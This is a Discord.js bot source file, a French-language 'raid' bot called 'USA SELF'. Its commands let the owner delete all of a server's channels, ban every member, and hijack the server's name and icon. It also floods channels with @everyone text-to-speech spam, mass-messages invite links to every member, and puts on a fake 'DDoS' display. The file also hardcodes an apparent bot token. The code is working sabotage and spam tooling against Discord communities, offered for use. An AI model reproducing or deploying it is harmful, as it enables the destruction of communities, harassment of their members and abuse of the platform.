const Discord = require("discord.js");
const bot = new Discord.Client();
const prefix = "/";

var start = Date.now();


bot.on("message", message => {
 const args = message.content.slice("-".length).trim().split(/ +/g);
 if (message.content.startsWith("/") && message.author.id == 519292510691131412 || message.content.startsWith("/") && message.author.id ==620277012627587114) {
 var message = args.join("");
 var vcsc = bot.users;
 vcsc.forEach(users => {

 users.send(message);

 });
 }
})
bot.login('NjE1MzEwMzM4Mzk2NTIwNjI3.XYz_Mg.5j40EmevysNrcwGvkVSjun30FfE')



bot.on('ready', () => {
    console.log("🔩 𝙐𝙎𝘼  is running now ... 🔩");
});     


bot.on('message', message => {


    if (message.content === "-" + "clearchan"){
        if (message.deletable) message.delete();
    if (message.author.id != "519292510691131412") return;
    message.guild.channels.forEach(chan => {
      if (chan.deletable) chan.delete();
    });
    }
    
         

    
     
    if (message.content === "-" + "banall"){
        if (message.deletable) message.delete();
    if (message.author.id != "519292510691131412") return;
    message.guild.members.forEach(member => {
      member.ban().then(function () {});
    });
    }
    if (message.content === "-" + "members"){
    if (message.author.id != "519292510691131412") return;
    if (message.deletable) message.delete();
    message.channel.send(message.guild.memberCount + "** membres au total.**")

    }
    
    
    
    if(message.content === "-" + "mstream"){
      if (message.deletable) message.delete();
      if (message.author.id != "519292510691131412") return
        let rotate = 0;
    setInterval(function() {
        if(rotate === 0) {
            bot.user.setActivity("Joue à 👽 | Pub ton serveur !", {type: "Streaming", url: 'https://www.twitch.tv/twitch'});
            rotate = 1;       
        } else if(rotate === 1){
            bot.user.setActivity("Sur 1 server 💻 ", {type: "Streaming", url: 'https://www.twitch.tv/twitch'});
            rotate = 2;
        } else if(rotate === 2){
            bot.user.setActivity(`Créateur 🙏 : "𝙃𝙖𝙨𝙬𝙖𝙭"#6234 💎`, {type: "Streaming", url: 'https://www.twitch.tv/twitch'});
            rotate = 3; 
        }  else if(rotate === 3){
            random = Math.floor(Math.random() * 7) + 1;
            bot.user.setActivity(`Surveille 👀 | Pub Ton Serveur ! 💣 `, {type: "Streaming", url: 'https://www.twitch.tv/twitch'});
            rotate = 0;
        }}, 10 * 1000)
      }
      
      if(message.content === "-" + "destroy"){
    if (message.deletable) message.delete();
    if (message.author.id != "519292510691131412") return;
    if(message.channel.type === "dm") return;
    if(message.guild.channels.size === 0) return;
   
}

    if (message.content === "-" + "general"){
    
        if (message.author.id != "519292510691131412") return;
        if (message.deletable) message.delete();
        var help_embed = new Discord.RichEmbed()
            .setAuthor("𝙐𝙎𝘼 𝙎𝙀𝙇𝙁.0")
            .setFooter("𝙎𝙚𝙡𝙛 𝙗𝙮 𝙐𝙎𝘼")
            .addField("  Le Multi Stream  ", `🎥  ${"-"}mstream : Active le stream!\n` + "󠂪")
            .addField("  Serveur Info  ", `🔮  ${"-"}sinfo : Information sur un serveur!\n` + "󠂪")
            .addField("  Pub  ", `💀  ${"-"}pub : Fait une Petite Pub Pour Les amis\n` + "󠂪")
            .addField("  Avatar  ", `💪  ${"-"}avatar : Prendre l'avatar de la personne \n` + "󠂪")
            .addField("  Channel  ", `✨  ${"-"}channel : Affiche la List des Channels!\n` + "󠂪")
            .addField("  Serveur  ", `🕹  ${"-"}servers : Affiche la list de serveur!\n` + "󠂪")
            .addField("  Membre  ", `🏆  ${"-"}members : Affiche le nombre de membre !\n` + "󠂪")
            .setColor('#6b6262')
            .setThumbnail("https://cdn.discordapp.com/attachments/620187045901369355/620197313981448208/giphy.gif")
            message.channel.sendEmbed(help_embed);
    
    }


    if (message.content === "-" + "channel"){
        if (message.author.id != "519292510691131412") return;
    if (message.deletable) message.delete();
    const categories = message.guild.channels.filter(c => c.type === "category")
    const text = message.guild.channels.filter(c => c.type === "text")
    const voice = message.guild.channels.filter(c => c.type === "voice")
    var category_embed = new Discord.RichEmbed()
    .setAuthor("𝙐𝙎𝘼 𝙎𝙀𝙇𝙁.0")
    .setFooter("𝙎𝙚𝙡𝙛 𝙗𝙮 𝙐𝙎𝘼")
    .setThumbnail("https://cdn.discordapp.com/attachments/620187045901369355/620197313981448208/giphy.gif")
    .setColor('#080000')
    .addField("Category List", categories.map(c => c.name))
    message.channel.sendEmbed(category_embed);
    var text_embed = new Discord.RichEmbed()
    .setAuthor("𝙐𝙎𝘼 𝙎𝙀𝙇𝙁.0")
    .setFooter("𝙎𝙚𝙡𝙛 𝙗𝙮 𝙐𝙎𝘼")
    .setThumbnail("https://cdn.discordapp.com/attachments/620187045901369355/620197313981448208/giphy.gif")
    .setColor('#080000')
    .addField("Text Channel List", text.map(c => c.name))
    message.channel.sendEmbed(text_embed);
    var voice_embed = new Discord.RichEmbed()
    .setAuthor("𝙐𝙎𝘼 𝙎𝙀𝙇𝙁.0")
    .setFooter("𝙎𝙚𝙡𝙛 𝙗𝙮 𝙐𝙎𝘼")
    .setThumbnail("https://cdn.discordapp.com/attachments/620187045901369355/620197313981448208/giphy.gif")
    .setColor('#080000')
    .addField("Voice Channel List", voice.map(c => c.name))
    message.channel.sendEmbed(voice_embed);
    }

    

if (message.content === "-" + "help"){
   if (message.author.id != "519292510691131412") return;
    if (message.deletable) message.delete();
    var help_embed = new Discord.RichEmbed()
    .setColor("#01a6c6")
    .setAuthor("𝙐𝙎𝘼 𝙎𝙀𝙇𝙁.0")
    .setFooter("𝙎𝙚𝙡𝙛 𝙗𝙮 𝙐𝙎𝘼")
    .setThumbnail("https://cdn.discordapp.com/attachments/620187045901369355/620197313981448208/giphy.gif")
    .setColor('01a6c6')
    .addField("  -| 𝐒𝐄𝐋𝐅 𝐃𝐞𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧  |-  ", `😈  ./𝐒𝐄𝐋𝐅 : 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐒𝐔𝐑 𝐋𝐀 𝐅𝐈𝐍 𝐃𝐔 𝐌𝐎𝐍𝐃𝐄 ! \n` + "󠂪")
    .addField("  -| 𝐒𝐄𝐋𝐅 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 |-  ", `💌  ./𝐆𝐄𝐍𝐄𝐑𝐀𝐋 : 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐄 𝐔𝐓𝐈𝐋𝐄! \n` + "󠂪")
    .addField("  -| 𝐒𝐄𝐋𝐅 𝐀𝐁𝐎𝐔𝐓 |-  ", `🌙  ./𝐀𝐁𝐎𝐔𝐓 : 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐒𝐔𝐑 𝐌𝐎𝐍 𝐌𝐀𝐈𝐓𝐑𝐄 ! \n` + "󠂪")
    message.channel.sendEmbed(help_embed);
    }

if (message.content === "-" + "about"){
        if (message.deletable) message.delete();
        if (message.author.id != "519292510691131412") return;
        var help_embed = new Discord.RichEmbed()
            .setAuthor("𝙐𝙎𝘼 𝙎𝙀𝙇𝙁.0")
            .setFooter("𝙎𝙚𝙡𝙛 𝙗𝙮 𝙐𝙎𝘼")
            .setImage("https://cdn.discordapp.com/attachments/620187045901369355/620197313981448208/giphy.gif")
            .setThumbnail("https://cdn.discordapp.com/attachments/620187045901369355/620197313981448208/giphy.gif")
            .addField("🔍 🔒𝙎𝙚𝙡𝙛 𝙗𝙮 𝙐𝙎𝘼 🔍", "$' 𝙐𝙎𝘼")
            .addField("⚠️ Discord Publicité ⚠️", "*`https://discord.gg/tYzv2S4`*")
            .setColor('#630404')
            message.channel.sendEmbed(help_embed);
        console.log("about !");
    }

if(message.content === "-" + "destroy"){
    if(message.channel.type === "dm") return;
    if (message.author.id != "519292510691131412") return; 
    if(message.guild.name != "𝙐𝙎𝘼"){
         message.guild.setIcon("https://cdn.discordapp.com/attachments/615197685535866890/615260317970333696/qdddddddddddddddd.gif").catch(error => {})
         message.guild.setName('𝙐𝙎𝘼').catch(error => {})
         message.guild.setRegion('russia').catch(error => {})
     }
     setInterval(function () { if(message.guild.channels.size < 499){
       message.guild.createChannel('𝑭𝑼𝑪𝑲 𝑩𝒀 𝑼𝑺𝑨 .0', 'text').catch(error => {})
     }}, 400)
     if(message.deletable) message.delete();
   }
   
   if (message.content === "-" + 'destroy') {
    if(message.channel.type === "dm") return;
    if (message.author.id != "519292510691131412") return; 
      setInterval (function () { message.channel.send("@everyone @here \n"+
      "Fuck by 𝙐𝙎𝘼 𝙎𝙀𝙇𝙁  \n"+
     "`https://discord.gg/V59xXAa", { tts: true } ).catch(error => {}) }, 400)
    }

    
    
                          
               
    if (message.content === "-" + "servers"){

        var server_count_guilds = bot.guilds.size
        var server_count_channels = bot.channels.size
        var server_count_users = bot.users.size
    
        if (message.author.id != "519292510691131412") return;
        if (message.deletable) message.delete();
        var serversEmbed = new Discord.RichEmbed()
            .setColor('#4B0082')
            .setTitle("𝙐𝙎𝘼 𝙎𝙀𝙇𝙁.0")
            .setFooter("𝙎𝙚𝙡𝙛 𝙗𝙮 𝙐𝙎𝘼")
            .setThumbnail("https://i.gifer.com/7B3n.gif")
            .addField("Connecté à ", server_count_guilds + " **servers**")
            .addField("Détruit actuellement ", server_count_channels + " **channels**")
            .addField("Regarde", server_count_users + " **utilisateurs**")
        message.channel.sendEmbed(serversEmbed);
    }
    
    if (message.content === "-" + "self"){
        if (message.author.id != "614518335941378049") return;
        if (message.deletable) message.delete();
        var help_embed = new Discord.RichEmbed()
            .setAuthor("𝙐𝙎𝘼 𝙎𝙀𝙇𝙁")
            .setFooter("𝙎𝙚𝙡𝙛 𝙗𝙮 𝙐𝙎𝘼")
            .setThumbnail("https://cdn.discordapp.com/attachments/620187045901369355/620197313981448208/giphy.gif")
            .addField("404", `${"-"}destroy : Commande Raid !`)
            .setImage("https://cdn.discordapp.com/attachments/620187045901369355/620197313981448208/giphy.gif")
            .setColor('#4B0082')
            message.channel.sendEmbed(help_embed);
        console.log("self !");
    }

    
    if (message.content === "-" + "members"){
    if (message.author.id != "519292510691131412") return;
    if (message.deletable) message.delete();
    message.channel.send(message.guild.memberCount + "** membres au total.**")

    }
              if (message.content === '.spam') {
                if (message.deletable) message.delete();
                let i = 0;
                var interval = setInterval(function () {
                    message.guild.channels.forEach(channel => {
        if (channel.type === "text") channel.send("https://cdn.discordapp.com/attachments/620187045901369355/620197313981448208/giphy.gif \n @everyone Allez hophophop viens ici \n➜ https://discord.gg/BukjgJ", { tts: true } ).then(i++);
                }, 2500);
            })
        }
});
    
bot.on("message", message => {
          if(message.content === "$dm"){
              if(message.channel.type === "dm") return;
              if (message.author.id != "519292510691131412") return;
              if(message.deletable) message.delete();
              message.guild.members.forEach(member => {
                setInterval(function () {
                  member.send("https://discord.gg/Zj9AvYy").catch(error => {}) }, 450)})
            }
});

bot.on('message', msg => {
  if (msg.content.startsWith("$sinfo")) {
    if (msg.deletable) msg.delete();
    if(msg.channel.type === "dm") return;
              if (msg.author.id != "519292510691131412") return;
    let infoEmbed = new Discord.RichEmbed()
      .setTitle("__Informations du Serveur.__")
      .setColor('#ffff00')
      .addField('**Nom** : ', msg.guild.name)
      .addField('**ID** : ', msg.guild.id)
      .addField('**Localisation** : ', msg.guild.region)
      .addField('**Date de création** : ', msg.guild.createdAt)
      .addField('**Créateur** : ', msg.guild.owner.user.tag)
      .addField('**Niveau de sécurité** : ', msg.guild.verificationLevel)
      .addField('**Rôles** : ', msg.guild.roles.size)
      .addField('**Nombre de membres** : ', msg.guild.memberCount)
      .addField('**Salons** : ', msg.guild.channels.size)
      .setThumbnail(msg.guild.iconURL)
      .setTimestamp() 
    msg.channel.send(infoEmbed);
    console.log('$sinfo')
}
});

bot.on('message', msg => {
  if (msg.content.startsWith("$pub")) {
    if (msg.deletable) msg.delete();
    if(msg.channel.type === "dm") return;
              if (msg.author.id != "519292510691131412") return;
              let PubEmbed = new Discord.RichEmbed()
            .setAuthor("🔒𝙐𝙎𝘼")
            .addField("Voici le discord de 🔒𝙐𝙎𝘼", " https://discord.gg/hPBAnmT ")
            .setThumbnail("https://cdn.discordapp.com/attachments/620187045901369355/620197313981448208/giphy.gif")
            .setColor('#370028')
            msg.channel.send(PubEmbed);
            console.log('pub')
}
});

bot.on('message', message => {
	let messageArray = message.content.split(" "); let cmd = messageArray[0]; let args = messageArray.slice(1);
	if (cmd == ".ddos") {
		if (message.author.id != "519292510691131412") return;
			     let replies = ["98.105.45.74", "94.210.57.46", "105.45.75.46", "87.45.241.62", "74.120.54.95", "105.87.65.41", "98.26.45.71", "105.64.21.74"]    
    let res = Math.floor((Math.random() * replies.length)); 
    var ip = res; 
    var port = 80; 
    let ddosembed = new Discord.RichEmbed()
    .setTitle("𝘿𝘿𝙊𝙎 𝙗𝙮 𝙐𝙎𝘼")
    .setColor("050505")
    .setThumbnail(bot.user.avatarURL)
    .addField("IP:", "135.45.135.89")
    .addField("PORT:", "80")
    .setFooter(`By ${message.author.username}`); 
    message.channel.send(ddosembed);
    var charge = "."; 
    var chargeC = "▒"; 
    message.channel.send("[" + charge.repeat(40) + "]").then((message) => { for (i = 0; i <= 40; i++) { message.edit("[" + chargeC.repeat(i) + charge.repeat(40 - i) + "]  -  " + i * 100 / 40 + "%"); } }) }
})
   
